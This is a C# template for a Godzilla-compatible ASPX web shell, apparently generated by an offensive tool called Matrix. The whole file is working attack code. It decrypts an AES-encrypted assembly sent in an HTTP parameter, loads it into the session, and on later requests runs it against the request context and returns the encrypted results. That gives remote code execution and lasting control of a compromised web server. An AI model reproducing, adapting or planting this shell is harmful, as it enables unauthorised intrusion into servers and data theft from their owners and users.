/*
 * Godzilla-compatible ASPX shell (CSHARP_AES_BASE64), generated by Matrix.
 *
 * Placeholders:
 *   {{PASS}}  = connection password (HTTP parameter name)
 *   {{KEY16}} = MD5(secretKey)[0:16]  (16 ASCII chars, used as both key and IV)
 *
 * The seeded engine must expose a public no-arg constructor and live in a
 * class named LY (the standard Godzilla ASPX engine, or Matrix's
 * tool/godzilla_engine/MatrixGodzillaEngine.cs).
 */
var mxPass = "{{PASS}}";
var mxKey = System.Text.Encoding.Default.GetBytes("{{KEY16}}");
var mxRaw = System.Convert.FromBase64String(Context.Request[mxPass]);
using (var mxAlg = new RijndaelManaged())
{
    mxAlg.Key = mxKey;
    mxAlg.IV = mxKey;
    using (var mxDec = mxAlg.CreateDecryptor())
    {
        var mxData = mxDec.TransformFinalBlock(mxRaw, 0, mxRaw.Length);
        if (Session["payload"] == null)
        {
            Session["payload"] = Assembly.Load(mxData);
        }
        else
        {
            var mxOut = new MemoryStream();
            var mxObj = ((Assembly)Session["payload"]).CreateInstance("LY");
            mxObj.Equals(mxOut);
            mxObj.Equals(Context);
            mxObj.Equals(mxData);
            mxObj.ToString();
            var mxResult = mxOut.ToArray();
            mxOut.Dispose();
            var mxMd5 = System.BitConverter.ToString(
                new MD5CryptoServiceProvider().ComputeHash(
                    System.Text.Encoding.Default.GetBytes(mxPass + "{{KEY16}}"))).Replace("-", "");
            using (var mxEnc = mxAlg.CreateEncryptor())
            {
                Response.Write(mxMd5.Substring(0, 16));
                Response.Write(System.Convert.ToBase64String(
                    mxEnc.TransformFinalBlock(mxResult, 0, mxResult.Length)));
                Response.Write(mxMd5.Substring(16));
            }
        }
    }
}
